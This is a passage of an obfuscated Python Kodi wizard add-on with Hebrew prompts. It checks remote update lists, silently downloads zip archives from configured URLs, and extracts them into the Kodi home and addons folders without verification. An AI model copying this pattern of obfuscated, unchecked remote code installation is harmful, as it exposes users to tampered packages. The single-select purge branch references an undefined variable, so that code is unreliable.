		for OOO0000OO0OOO0000 in fnmatch .filter (OO00OO0O000O000OO ,'*.db'):#line:5499
			if OOO0000OO0OOO0000 !='Thumbs.db':#line:5500
				O00OO0O0O0O0000OO =os .path .join (OO00OO0OOOOOOO000 ,OOO0000OO0OOO0000 )#line:5501
				OO0O0OO00O000O00O .append (O00OO0O0O0O0000OO )#line:5502
				OO0OOOO0000OOOO00 =O00OO0O0O0O0000OO .replace ('\\','/').split ('/')#line:5503
				OOOO00O0000000O0O .append ('(%s) %s'%(OO0OOOO0000OOOO00 [len (OO0OOOO0000OOOO00 )-2 ],OO0OOOO0000OOOO00 [len (OO0OOOO0000OOOO00 )-1 ]))#line:5504
	if KODIV >=16 :#line:5505
		O000O00OOO0O0O0O0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO00O0000000O0O )#line:5506
		if O000O00OOO0O0O0O0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5507
		elif len (O000O00OOO0O0O0O0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5508
		else :#line:5509
			for OOO0OOOOOOO00O0OO in O000O00OOO0O0O0O0 :wiz .purgeDb (OO0O0OO00O000O00O [OOO0OOOOOOO00O0OO ])#line:5510
	else :#line:5511
		O000O00OOO0O0O0O0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO00O0000000O0O )#line:5512
		if O000O00OOO0O0O0O0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5513
		else :wiz .purgeDb (OO0O0OO00O000O00O [OOO0OOOOOOO00O0OO ])#line:5514
def fastupdatefirstbuild (O0OOO00000O00OOO0 ):#line:5520
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5522
	if ENABLE =='Yes':#line:5523
		if not NOTIFY =='true':#line:5524
			OOO00OO00000O0O00 =wiz .workingURL (NOTIFICATION )#line:5525
			if OOO00OO00000O0O00 ==True :#line:5526
				OO0000OOOO00O000O ,OOO00O000O00OO000 =wiz .splitNotify (NOTIFICATION )#line:5527
				if not OO0000OOOO00O000O ==False :#line:5529
					try :#line:5530
						OO0000OOOO00O000O =int (OO0000OOOO00O000O );O0OOO00000O00OOO0 =int (O0OOO00000O00OOO0 )#line:5531
						checkidupdate ()#line:5532
						wiz .setS ("notedismiss","true")#line:5533
						if OO0000OOOO00O000O ==O0OOO00000O00OOO0 :#line:5534
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0000OOOO00O000O ),xbmc .LOGNOTICE )#line:5535
						elif OO0000OOOO00O000O >O0OOO00000O00OOO0 :#line:5537
							wiz .log ("[Notifications] id: %s"%str (OO0000OOOO00O000O ),xbmc .LOGNOTICE )#line:5538
							wiz .setS ('noteid',str (OO0000OOOO00O000O ))#line:5539
							wiz .setS ("notedismiss","true")#line:5540
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5543
					except Exception as OOOO0O00OOO0OO00O :#line:5544
						wiz .log ("Error on Notifications Window: %s"%str (OOOO0O00OOO0OO00O ),xbmc .LOGERROR )#line:5545
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5547
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOO00OO00000O0O00 ),xbmc .LOGNOTICE )#line:5548
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5549
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5550
def checkUpdate ():#line:5552
	O00O0O0O00O00OO00 =wiz .getS ('disableupdate')#line:5553
	O000O0O0O00O0O000 =wiz .getS ('buildname')#line:5554
	O0O0O0000O00OO0OO =wiz .getS ('buildversion')#line:5555
	O0O0OOO0O0000O0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5556
	OOO0000OOOOO00OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O000O0O0O00O0O000 ).findall (O0O0OOO0O0000O0O0 )#line:5557
	if len (OOO0000OOOOO00OO0 )>0 :#line:5558
		OO0O00OOO00O0OOO0 =OOO0000OOOOO00OO0 [0 ][0 ]#line:5559
		OO0OO0OOO00OOOO00 =OOO0000OOOOO00OO0 [0 ][1 ]#line:5560
		O0O0OO0O0O0O00OOO =OOO0000OOOOO00OO0 [0 ][2 ]#line:5561
		wiz .setS ('latestversion',OO0O00OOO00O0OOO0 )#line:5562
		if OO0O00OOO00O0OOO0 >O0O0O0000O00OO0OO :#line:5563
			if O00O0O0O00O00OO00 =='false':#line:5564
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0O0O0000O00OO0OO ,OO0O00OOO00O0OOO0 ),xbmc .LOGNOTICE )#line:5565
				notify .updateWindow (O000O0O0O00O0O000 ,O0O0O0000O00OO0OO ,OO0O00OOO00O0OOO0 ,OO0OO0OOO00OOOO00 ,O0O0OO0O0O0O00OOO )#line:5566
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0O0O0000O00OO0OO ,OO0O00OOO00O0OOO0 ),xbmc .LOGNOTICE )#line:5567
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0O0O0000O00OO0OO ,OO0O00OOO00O0OOO0 ),xbmc .LOGNOTICE )#line:5568
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5569
def updatetelemedia (OO0O000000000OO00 ):#line:5570
    from startup import teleupdate #line:5571
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5572
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5573
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5574
    wiz .wizardUpdate ('startup')#line:5575
    checkUpdate ()#line:5577
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5578
    time .sleep (15.0 )#line:5579
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5580
     if teleupdate is False :#line:5581
        STARTP2 ()#line:5583
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5584
        if not NOTIFY =='true':#line:5585
            O0O00O0O0OOOO0O00 =wiz .workingURL (NOTIFICATION )#line:5586
            if O0O00O0O0OOOO0O00 ==True :#line:5587
                OO00O0OO00O0O0000 ,OOO000O0O0OO00OOO =wiz .splitNotify (NOTIFICATION )#line:5588
                if not OO00O0OO00O0O0000 ==False :#line:5589
                    try :#line:5590
                        OO00O0OO00O0O0000 =int (OO00O0OO00O0O0000 );OO0O000000000OO00 =int (OO0O000000000OO00 )#line:5591
                        if OO00O0OO00O0O0000 ==OO0O000000000OO00 :#line:5592
                            if NOTEDISMISS =='false':#line:5593
                                debridit .debridIt ('update','all')#line:5594
                                traktit .traktIt ('update','all')#line:5595
                                checkidupdatetele ()#line:5596
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO00O0OO00O0O0000 ),xbmc .LOGNOTICE )#line:5597
                        elif OO00O0OO00O0O0000 >OO0O000000000OO00 :#line:5598
                            wiz .log ("[Notifications] id: %s"%str (OO00O0OO00O0O0000 ),xbmc .LOGNOTICE )#line:5599
                            wiz .setS ('noteid',str (OO00O0OO00O0O0000 ))#line:5600
                            wiz .setS ('notedismiss','false')#line:5601
                            debridit .debridIt ('update','all')#line:5603
                            traktit .traktIt ('update','all')#line:5604
                            checkidupdatetele ()#line:5605
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5607
                    except Exception as OOOO0O00O0OOOO000 :#line:5608
                        wiz .log ("Error on Notifications Window: %s"%str (OOOO0O00O0OOOO000 ),xbmc .LOGERROR )#line:5609
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5610
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O00O0O0OOOO0O00 ),xbmc .LOGNOTICE )#line:5611
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5612
def checkidupdate ():#line:5616
				wiz .setS ("notedismiss","true")#line:5618
				OOO00OOO0O0O0O0OO =wiz .workingURL (NOTIFICATION )#line:5619
				O0000O00O00OOOOO0 =" Kodi Premium"#line:5621
				OO00OOOOOOOO0000O =wiz .checkBuild (O0000O00O00OOOOO0 ,'gui')#line:5622
				OOO0OOO0OOO0O00OO =O0000O00O00OOOOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5623
				if not wiz .workingURL (OO00OOOOOOOO0000O )==True :return #line:5624
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5625
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0000O00O00OOOOO0 ),'','אנא המתן')#line:5626
				O0OOOOOO00OOO0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0OOO0OOO0O00OO )#line:5627
				try :os .remove (O0OOOOOO00OOO0OO0 )#line:5628
				except :pass #line:5629
				logging .warning (OO00OOOOOOOO0000O )#line:5630
				if 'google'in OO00OOOOOOOO0000O :#line:5631
				   O0O00O0OOOOO0O0OO =googledrive_download (OO00OOOOOOOO0000O ,O0OOOOOO00OOO0OO0 ,DP ,wiz .checkBuild (O0000O00O00OOOOO0 ,'filesize'))#line:5632
				else :#line:5635
				  downloader .download (OO00OOOOOOOO0000O ,O0OOOOOO00OOO0OO0 ,DP )#line:5636
				xbmc .sleep (100 )#line:5637
				OOOOO0O0OOO0000O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O00O00OOOOO0 )#line:5638
				DP .update (0 ,OOOOO0O0OOO0000O0 ,'','אנא המתן')#line:5639
				extract .all (O0OOOOOO00OOO0OO0 ,HOME ,DP ,title =OOOOO0O0OOO0000O0 )#line:5640
				DP .close ()#line:5641
				wiz .defaultSkin ()#line:5642
				wiz .lookandFeelData ('save')#line:5643
				if KODIV >=18 :#line:5644
					skindialogsettind18 ()#line:5645
				if INSTALLMETHOD ==1 :O0OO0OOOO0OOOOO0O =1 #line:5648
				elif INSTALLMETHOD ==2 :O0OO0OOOO0OOOOO0O =0 #line:5649
				else :DP .close ()#line:5650
def checkidupdatetele ():#line:5651
				wiz .setS ("notedismiss","true")#line:5653
				OO0O000000O0OOOO0 =wiz .workingURL (NOTIFICATION )#line:5654
				O0000O00OO00OO0O0 =" Kodi Premium"#line:5656
				O00O0O00O000O0000 =wiz .checkBuild (O0000O00OO00OO0O0 ,'gui')#line:5657
				OOO000O0OOOOO0000 =O0000O00OO00OO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5658
				if not wiz .workingURL (O00O0O00O000O0000 )==True :return #line:5659
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5660
				O0OOOO0O00O0O0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO000O0OOOOO0000 )#line:5663
				try :os .remove (O0OOOO0O00O0O0OO0 )#line:5664
				except :pass #line:5665
				if 'google'in O00O0O00O000O0000 :#line:5667
				   OOOO0OOOOOO000O0O =googledrive_download (O00O0O00O000O0000 ,O0OOOO0O00O0O0OO0 ,DP2 ,wiz .checkBuild (O0000O00OO00OO0O0 ,'filesize'))#line:5668
				else :#line:5671
				  downloaderbg .download3 (O00O0O00O000O0000 ,O0OOOO0O00O0O0OO0 ,DP2 )#line:5672
				xbmc .sleep (100 )#line:5673
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5674
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5676
				extract .all2 (O0OOOO0O00O0O0OO0 ,HOME ,DP2 )#line:5678
				DP2 .close ()#line:5679
				wiz .defaultSkin ()#line:5680
				wiz .lookandFeelData ('save')#line:5681
				wiz .kodi17Fix ()#line:5682
				if KODIV >=18 :#line:5683
					skindialogsettind18 ()#line:5684
				debridit .debridIt ('restore','all')#line:5689
				traktit .traktIt ('restore','all')#line:5690
				if INSTALLMETHOD ==1 :OOOOOO0OOO0000OO0 =1 #line:5691
				elif INSTALLMETHOD ==2 :OOOOOO0OOO0000OO0 =0 #line:5692
				else :DP2 .close ()#line:5693
				O0O0OOO000OOO0O0O =(NOTIFICATION2 )#line:5694
				O00000OOOOOOOO0OO =urllib2 .urlopen (O0O0OOO000OOO0O0O )#line:5695
				O0O00OOO000OOOO00 =O00000OOOOOOOO0OO .readlines ()#line:5696
				OO0OO0OO000O0O00O =0 #line:5697
				for O00O0OOOOOOOOOO00 in O0O00OOO000OOOO00 :#line:5700
					if O00O0OOOOOOOOOO00 .split (' ==')[0 ]=="noreset"or O00O0OOOOOOOOOO00 .split ()[0 ]=="noreset":#line:5701
						xbmc .executebuiltin ("ReloadSkin()")#line:5703
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5704
						O0O0OO00OOO00O00O =(ADDON .getSetting ("message"))#line:5705
						if O0O0OO00OOO00O00O =='true':#line:5706
							infobuild ()#line:5707
						update_Votes ()#line:5708
						indicatorfastupdate ()#line:5709
					if O00O0OOOOOOOOOO00 .split (' ==')[0 ]=="reset"or O00O0OOOOOOOOOO00 .split ()[0 ]=="reset":#line:5710
						update_Votes ()#line:5712
						indicatorfastupdate ()#line:5713
						resetkodi ()#line:5714
def gaiaserenaddon ():#line:5715
  OO00O0O0OO00OOO0O =(ADDON .getSetting ("gaiaseren"))#line:5716
  OO0OOO0OOO0O0OOOO =(ADDON .getSetting ("auto_rd"))#line:5717
  if OO00O0O0OO00OOO0O =='true'and OO0OOO0OOO0O0OOOO =='true':#line:5718
    O0OO0O00OO00O0000 =(NEWFASTUPDATE )#line:5719
    O00O00OO0O0000O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5720
    OOO00O0O0000OOOOO =xbmcgui .DialogProgress ()#line:5721
    OOO00O0O0000OOOOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5722
    O0000OOOOO0OOO0OO =os .path .join (PACKAGES ,'isr.zip')#line:5723
    OO0OO0O0O000O0O0O =urllib2 .Request (O0OO0O00OO00O0000 )#line:5724
    O00000OOO0O00O0O0 =urllib2 .urlopen (OO0OO0O0O000O0O0O )#line:5725
    O00OO000O00OOO000 =xbmcgui .DialogProgress ()#line:5727
    O00OO000O00OOO000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5728
    O00OO000O00OOO000 .update (0 )#line:5729
    OO0OO00OO0OOO0OOO =open (O0000OOOOO0OOO0OO ,'wb')#line:5731
    try :#line:5733
      O0O00O00O00O00O0O =O00000OOO0O00O0O0 .info ().getheader ('Content-Length').strip ()#line:5734
      O0O0O00OOOOO0OOO0 =True #line:5735
    except AttributeError :#line:5736
          O0O0O00OOOOO0OOO0 =False #line:5737
    if O0O0O00OOOOO0OOO0 :#line:5739
          O0O00O00O00O00O0O =int (O0O00O00O00O00O0O )#line:5740
    OOO0O0O0O00O000O0 =0 #line:5742
    OOO00OOO00O0OOO0O =time .time ()#line:5743
    while True :#line:5744
          OO0O0OO0O0O00O000 =O00000OOO0O00O0O0 .read (8192 )#line:5745
          if not OO0O0OO0O0O00O000 :#line:5746
              sys .stdout .write ('\n')#line:5747
              break #line:5748
          OOO0O0O0O00O000O0 +=len (OO0O0OO0O0O00O000 )#line:5750
          OO0OO00OO0OOO0OOO .write (OO0O0OO0O0O00O000 )#line:5751
          if not O0O0O00OOOOO0OOO0 :#line:5753
              O0O00O00O00O00O0O =OOO0O0O0O00O000O0 #line:5754
          if O00OO000O00OOO000 .iscanceled ():#line:5755
             O00OO000O00OOO000 .close ()#line:5756
             try :#line:5757
              os .remove (O0000OOOOO0OOO0OO )#line:5758
             except :#line:5759
              pass #line:5760
             break #line:5761
          O00O00000OO000OOO =float (OOO0O0O0O00O000O0 )/O0O00O00O00O00O0O #line:5762
          O00O00000OO000OOO =round (O00O00000OO000OOO *100 ,2 )#line:5763
          OOO0O00OOOOOOO00O =OOO0O0O0O00O000O0 /(1024 *1024 )#line:5764
          O0OO0OOO000OOOOO0 =O0O00O00O00O00O0O /(1024 *1024 )#line:5765
          OO000OOO00O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O00OOOOOOO00O ,'teal',O0OO0OOO000OOOOO0 )#line:5766
          if (time .time ()-OOO00OOO00O0OOO0O )>0 :#line:5767
            O0O000O000000O0OO =OOO0O0O0O00O000O0 /(time .time ()-OOO00OOO00O0OOO0O )#line:5768
            O0O000O000000O0OO =O0O000O000000O0OO /1024 #line:5769
          else :#line:5770
           O0O000O000000O0OO =0 #line:5771
          O0OOOO0OO00O00O0O ='KB'#line:5772
          if O0O000O000000O0OO >=1024 :#line:5773
             O0O000O000000O0OO =O0O000O000000O0OO /1024 #line:5774
             O0OOOO0OO00O00O0O ='MB'#line:5775
          if O0O000O000000O0OO >0 and not O00O00000OO000OOO ==100 :#line:5776
              O0O0O000O00000O0O =(O0O00O00O00O00O0O -OOO0O0O0O00O000O0 )/O0O000O000000O0OO #line:5777
          else :#line:5778
              O0O0O000O00000O0O =0 #line:5779
          O00O00000OOO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O000O000000O0OO ,O0OOOO0OO00O00O0O )#line:5780
          O00OO000O00OOO000 .update (int (O00O00000OO000OOO ),OO000OOO00O000OOO ,O00O00000OOO0O0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5782
    O0OO000000O0OO00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5785
    OO0OO00OO0OOO0OOO .close ()#line:5788
    extract .all (O0000OOOOO0OOO0OO ,O0OO000000O0OO00O ,O00OO000O00OOO000 )#line:5789
    try :#line:5793
      os .remove (O0000OOOOO0OOO0OO )#line:5794
    except :#line:5795
      pass #line:5796
def iptvsimpldownpc ():#line:5797
    O00OOO000O0O0O000 =(IPTVSIMPL18PC )#line:5799
    O0OOO0O00O0O0OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5800
    O0O0OOOO0OOOOOO00 =xbmcgui .DialogProgress ()#line:5801
    O0O0OOOO0OOOOOO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5802
    O00OOOOOOO0O000O0 =os .path .join (PACKAGES ,'isr.zip')#line:5803
    OO0O0000O0OO0O000 =urllib2 .Request (O00OOO000O0O0O000 )#line:5804
    OO0O00OO00O0OO00O =urllib2 .urlopen (OO0O0000O0OO0O000 )#line:5805
    O0O0O0OOO000O0O0O =xbmcgui .DialogProgress ()#line:5807
    O0O0O0OOO000O0O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5808
    O0O0O0OOO000O0O0O .update (0 )#line:5809
    OOOO0O0O0OOOO0000 =open (O00OOOOOOO0O000O0 ,'wb')#line:5811
    try :#line:5813
      O0OO0000O0O0OO00O =OO0O00OO00O0OO00O .info ().getheader ('Content-Length').strip ()#line:5814
      OO00O0OO0O0OOO0O0 =True #line:5815
    except AttributeError :#line:5816
          OO00O0OO0O0OOO0O0 =False #line:5817
    if OO00O0OO0O0OOO0O0 :#line:5819
          O0OO0000O0O0OO00O =int (O0OO0000O0O0OO00O )#line:5820
    OOO0O0OOO0OOOO00O =0 #line:5822
    OO00O0O00O0OO0O0O =time .time ()#line:5823
    while True :#line:5824
          OOOO0O00OO00000OO =OO0O00OO00O0OO00O .read (8192 )#line:5825
          if not OOOO0O00OO00000OO :#line:5826
              sys .stdout .write ('\n')#line:5827
              break #line:5828
          OOO0O0OOO0OOOO00O +=len (OOOO0O00OO00000OO )#line:5830
          OOOO0O0O0OOOO0000 .write (OOOO0O00OO00000OO )#line:5831
          if not OO00O0OO0O0OOO0O0 :#line:5833
              O0OO0000O0O0OO00O =OOO0O0OOO0OOOO00O #line:5834
          if O0O0O0OOO000O0O0O .iscanceled ():#line:5835
             O0O0O0OOO000O0O0O .close ()#line:5836
             try :#line:5837
              os .remove (O00OOOOOOO0O000O0 )#line:5838
             except :#line:5839
              pass #line:5840
             break #line:5841
          OO000O0O00O00O0OO =float (OOO0O0OOO0OOOO00O )/O0OO0000O0O0OO00O #line:5842
          OO000O0O00O00O0OO =round (OO000O0O00O00O0OO *100 ,2 )#line:5843
          OO0OOO0000OO0OOO0 =OOO0O0OOO0OOOO00O /(1024 *1024 )#line:5844
          OO00OO0O0O000O0O0 =O0OO0000O0O0OO00O /(1024 *1024 )#line:5845
          O000OOO0OOOO0OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OOO0000OO0OOO0 ,'teal',OO00OO0O0O000O0O0 )#line:5846
          if (time .time ()-OO00O0O00O0OO0O0O )>0 :#line:5847
            OO0O000000O0O0OOO =OOO0O0OOO0OOOO00O /(time .time ()-OO00O0O00O0OO0O0O )#line:5848
            OO0O000000O0O0OOO =OO0O000000O0O0OOO /1024 #line:5849
          else :#line:5850
           OO0O000000O0O0OOO =0 #line:5851
          O0OO00OOOOO00O0OO ='KB'#line:5852
          if OO0O000000O0O0OOO >=1024 :#line:5853
             OO0O000000O0O0OOO =OO0O000000O0O0OOO /1024 #line:5854
             O0OO00OOOOO00O0OO ='MB'#line:5855
          if OO0O000000O0O0OOO >0 and not OO000O0O00O00O0OO ==100 :#line:5856
              O0000O00000OO00OO =(O0OO0000O0O0OO00O -OOO0O0OOO0OOOO00O )/OO0O000000O0O0OOO #line:5857
          else :#line:5858
              O0000O00000OO00OO =0 #line:5859
          OO0OO0O0000O000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O000000O0O0OOO ,O0OO00OOOOO00O0OO )#line:5860
          O0O0O0OOO000O0O0O .update (int (OO000O0O00O00O0OO ),O000OOO0OOOO0OOOO ,OO0OO0O0000O000O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5862
    O0O0OO0000OO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5865
    OOOO0O0O0OOOO0000 .close ()#line:5868
    extract .all (O00OOOOOOO0O000O0 ,O0O0OO0000OO0O0OO ,O0O0O0OOO000O0O0O )#line:5869
    try :#line:5873
      os .remove (O00OOOOOOO0O000O0 )#line:5874
    except :#line:5875
      pass #line:5876
def iptvkodi18idan ():#line:5877
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5879
              O0OOOO0O00O00O00O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5882
              O00O000OOOO0O000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5883
              OO0OO0O00000OO00O =xbmcgui .DialogProgress ()#line:5884
              OO0OO0O00000OO00O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5885
              O0OO00OOOO0OO0000 =os .path .join (O00O000OOOO0O000O ,'isr.zip')#line:5886
              O00O0OO000O0O0O00 =urllib2 .Request (O0OOOO0O00O00O00O )#line:5887
              OOOO00O0O0OOO0000 =urllib2 .urlopen (O00O0OO000O0O0O00 )#line:5888
              O0O0O000OOO00O0OO =xbmcgui .DialogProgress ()#line:5890
              O0O0O000OOO00O0OO .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5891
              O0O0O000OOO00O0OO .update (0 )#line:5892
              O0OO0O0O0OO0OO00O =open (O0OO00OOOO0OO0000 ,'wb')#line:5894
              try :#line:5896
                OOO000OO00O0OOOOO =OOOO00O0O0OOO0000 .info ().getheader ('Content-Length').strip ()#line:5897
                OO0OO000O0000OO0O =True #line:5898
              except AttributeError :#line:5899
                    OO0OO000O0000OO0O =False #line:5900
              if OO0OO000O0000OO0O :#line:5902
                    OOO000OO00O0OOOOO =int (OOO000OO00O0OOOOO )#line:5903
              O0OO000O00O0000OO =0 #line:5905
              O0O00OOOO00OO00O0 =time .time ()#line:5906
              while True :#line:5907
                    OOO00OO000O0O0000 =OOOO00O0O0OOO0000 .read (8192 )#line:5908
                    if not OOO00OO000O0O0000 :#line:5909
                        sys .stdout .write ('\n')#line:5910
                        break #line:5911
                    O0OO000O00O0000OO +=len (OOO00OO000O0O0000 )#line:5913
                    O0OO0O0O0OO0OO00O .write (OOO00OO000O0O0000 )#line:5914
                    if not OO0OO000O0000OO0O :#line:5916
                        OOO000OO00O0OOOOO =O0OO000O00O0000OO #line:5917
                    if O0O0O000OOO00O0OO .iscanceled ():#line:5918
                       O0O0O000OOO00O0OO .close ()#line:5919
                       try :#line:5920
                        os .remove (O0OO00OOOO0OO0000 )#line:5921
                       except :#line:5922
                        pass #line:5923
                       break #line:5924
                    O00O0000O0000O0OO =float (O0OO000O00O0000OO )/OOO000OO00O0OOOOO #line:5925
                    O00O0000O0000O0OO =round (O00O0000O0000O0OO *100 ,2 )#line:5926
                    O00O0O00OOOO0000O =O0OO000O00O0000OO /(1024 *1024 )#line:5927
                    OO00O00OOO0OO0000 =OOO000OO00O0OOOOO /(1024 *1024 )#line:5928
                    OOOOOOOO0OO0OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0O00OOOO0000O ,'teal',OO00O00OOO0OO0000 )#line:5929
                    if (time .time ()-O0O00OOOO00OO00O0 )>0 :#line:5930
                      OOO00OOOOOO00O000 =O0OO000O00O0000OO /(time .time ()-O0O00OOOO00OO00O0 )#line:5931
                      OOO00OOOOOO00O000 =OOO00OOOOOO00O000 /1024 #line:5932
                    else :#line:5933
                     OOO00OOOOOO00O000 =0 #line:5934
                    O000OO0000000O0OO ='KB'#line:5935
                    if OOO00OOOOOO00O000 >=1024 :#line:5936
                       OOO00OOOOOO00O000 =OOO00OOOOOO00O000 /1024 #line:5937
                       O000OO0000000O0OO ='MB'#line:5938
                    if OOO00OOOOOO00O000 >0 and not O00O0000O0000O0OO ==100 :#line:5939
                        O0O00O0000O0OOO0O =(OOO000OO00O0OOOOO -O0OO000O00O0000OO )/OOO00OOOOOO00O000 #line:5940
                    else :#line:5941
                        O0O00O0000O0OOO0O =0 #line:5942
                    OOO0O0OO000O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00OOOOOO00O000 ,O000OO0000000O0OO )#line:5943
                    O0O0O000OOO00O0OO .update (int (O00O0000O0000O0OO ),"Downloading "+'iptv',OOOOOOOO0OO0OO000 ,OOO0O0OO000O0000O )#line:5945
              O00OOO0OO0OO00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5948
              O0OO0O0O0OO0OO00O .close ()#line:5951
              extract .all (O0OO00OOOO0OO0000 ,O00OOO0OO0OO00OOO ,O0O0O000OOO00O0OO )#line:5952
              try :#line:5955
                os .remove (O0OO00OOOO0OO0000 )#line:5956
              except :#line:5958
                pass #line:5959
              O0O0O000OOO00O0OO .close ()#line:5960
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5963
              O0OOOO0O00O00O00O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5965
              O00O000OOOO0O000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5966
              OO0OO0O00000OO00O =xbmcgui .DialogProgress ()#line:5967
              OO0OO0O00000OO00O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5968
              O0OO00OOOO0OO0000 =os .path .join (O00O000OOOO0O000O ,'isr.zip')#line:5969
              O00O0OO000O0O0O00 =urllib2 .Request (O0OOOO0O00O00O00O )#line:5970
              OOOO00O0O0OOO0000 =urllib2 .urlopen (O00O0OO000O0O0O00 )#line:5971
              O0O0O000OOO00O0OO =xbmcgui .DialogProgress ()#line:5973
              O0O0O000OOO00O0OO .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5974
              O0O0O000OOO00O0OO .update (0 )#line:5975
              O0OO0O0O0OO0OO00O =open (O0OO00OOOO0OO0000 ,'wb')#line:5977
              try :#line:5979
